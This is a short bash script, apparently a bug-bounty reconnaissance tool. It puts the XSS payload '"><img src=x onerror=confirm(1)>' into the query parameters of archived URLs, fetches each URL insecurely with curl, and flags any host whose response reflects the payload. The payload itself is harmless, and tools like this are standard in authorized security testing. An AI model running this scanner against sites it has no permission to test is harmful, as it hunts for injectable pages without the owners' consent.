#!/bin/bash

waybacks=$1

cat $waybacks | grep "=" | qsreplace '"><img src=x onerror=confirm(1)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<img src=x onerror=confirm(1)>" \
&& echo "$host" Reflected input found; done
